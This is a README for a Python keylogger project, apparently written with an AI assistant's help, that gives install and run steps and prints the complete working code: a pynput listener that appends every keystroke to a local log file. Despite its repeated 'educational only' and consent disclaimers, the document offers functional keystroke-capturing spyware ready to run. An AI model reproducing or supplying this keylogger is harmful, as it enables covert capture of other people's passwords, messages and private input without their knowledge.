

# Python Keylogger

A simple, educational keylogger written in Python using the `pynput` library to capture and log keystrokes. This project is designed to demonstrate how keyboard events can be captured programmatically. **This code is for educational purposes only**—please ensure that you have explicit consent before using this software on any system.

---

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [How It Works](#how-it-works)
- [License](#license)
- [Disclaimer](#disclaimer)

---

## Overview

This Python keylogger captures and logs keystrokes from the keyboard to a local file. The script runs in the background, capturing all keyboard inputs and appending them to a log file (`log.txt`). 

**Note**: This project is intended for educational purposes, demonstrating basic keylogging functionality in Python. Unauthorized use of keyloggers is illegal and unethical. 

---

## Features

- **Keystroke Logging**: Records all keystrokes in real time.
- **Lightweight**: Minimal dependencies with only `pynput` required.
- **Cross-platform**: Should work on Windows, macOS, and Linux.
- **Simple Output**: Logs are saved to a plain text file (`log.txt`).

---

## Installation

Follow these steps to install and run the keylogger on your local machine:

1. **Clone the repository**:

   ```bash
   git clone https://github.com/yourusername/python-keylogger.git
   cd python-keylogger
   ```

2. **Install the required dependencies**:

   This project uses the `pynput` library to capture keystrokes. You can install it with `pip`:

   ```bash
   pip install pynput
   ```

---

## Usage

1. **Run the script**:

   To start the keylogger, run the following command:

   ```bash
   python keylogger.py
   ```

   The script will start capturing keystrokes and append each key press to a file named `log.txt` in the current directory.

2. **Stopping the script**:

   To stop the keylogger, press `Ctrl + C` in the terminal, or terminate the process via your operating system's task manager.

3. **View the log**:

   Open `log.txt` to view the captured keystrokes. Each keypress will be recorded on a new line.

---

## Code Example

Below is the core code of the keylogger:

```python
# Install the pynput library
# pip install pynput

from pynput.keyboard import Listener

def log_keystroke(key):
    # Convert key to string and remove unwanted characters
    key = str(key).replace("'", "")
    
    # Write the captured key to a log file
    with open("log.txt", "a") as f:
        f.write(key + "\n")

# Set up the listener to log keypress events
with Listener(on_press=log_keystroke) as listener:
    listener.join()
```

This code listens for keyboard events using the `pynput` library and appends every keypress to a text file called `log.txt`.

---

## How It Works

1. **Key Capture**: The keylogger listens for keystrokes via the `Listener` class from `pynput.keyboard`.
2. **Logging**: When a key is pressed, it is captured and written to the file `log.txt`.
3. **Background Operation**: The keylogger runs as a background process until manually stopped by the user.

---

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.

---

## Disclaimer

### **Important**: This code is intended for educational purposes **only**.

- **Ethical Usage**: Always use this software responsibly and ensure you have explicit consent before deploying it.
- **Illegal Use**: Unauthorized usage of keyloggers is illegal and can result in criminal charges. **Do not use this code for malicious activities.**
- **Creator’s Disclaimer**: The author of this project is not responsible for any misuse of the code.


### **Note on Ethics**:

- Do not deploy this keylogger on any machine without the explicit consent of the owner.
- Always follow ethical guidelines and comply with all relevant laws regarding data privacy and security.

---

With this README, your project now includes important information about installation, usage, and the ethical considerations of using a keylogger.
